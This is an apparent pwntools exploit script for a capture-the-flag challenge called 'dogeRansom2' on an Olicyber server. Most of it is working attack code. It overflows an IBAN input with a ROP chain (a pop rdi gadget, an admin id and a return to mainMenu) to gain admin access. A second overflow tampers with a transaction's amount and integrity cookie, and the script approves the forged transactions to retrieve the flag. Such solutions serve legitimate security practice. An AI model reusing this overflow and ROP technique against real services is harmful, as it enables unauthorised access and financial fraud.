from pwn import *

context.binary = elf = ELF('./dogeRansom2')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('dogeransom2.challs.olicyber.it', 10806)
elif args.GDB:
    r = gdb.debug(elf.path, gdbscript='''
                  b mainMenu
                  c
                  ''')
else:
    r = process(elf.path)

'''
user contents:
+0      -> username
+32     -> password
+64     -> money (int, 4 bytes)
+72     -> Transaction (long, 8 bytes)
+80     -> number of messages (char, 1 byte)
+81     -> message(s)
ends at +104

transaction contents:
+0      -> IBAN 
+36     -> amount (int, 4 bytes)
+40     -> timestamp (long, 8 bytes)
+48     -> checksum (char, 1 byte)
+49     -> Approved (char, 1 byte) is 3 if approved
+56     -> cookie (long, 8 bytes) (if modified, the transaction is invalid)
+64     -> byte 0x00
'''

username = b'Dr. Bez Casamiei'
password = b'Team-fortezza-10'
IBAN = b'IT70S0501811800000012284030'

r.sendlineafter(b'Username: ', username)
r.sendlineafter(b'Password: ', password)

payload = IBAN + b'\x00'*(64-len(IBAN)) + flat([
    0x40224b,    # pop rdi; ret
    0x406240,    # admin id
    elf.sym['mainMenu']
])

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'inviare: ', b'7')
r.sendlineafter(b'dogemoney: ', IBAN)
r.sendlineafter(b'iban: ', payload)

# Now we have logged in as admin

payload = IBAN + b'\x00'*(36-len(IBAN)) + p32(8) + b'\xFF'*8

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'inviare: ', b'8')
r.sendlineafter(b'dogemoney: ', payload)
r.sendlineafter(b'iban: ', IBAN)

# Approve both transactions

r.sendlineafter(b'> ', b'6')
r.sendlineafter(b'> ', b'Y')

r.sendlineafter(b'> ', b'6')
r.sendlineafter(b'> ', b'Y')

print(r.recvall(timeout=5).decode())
r.close()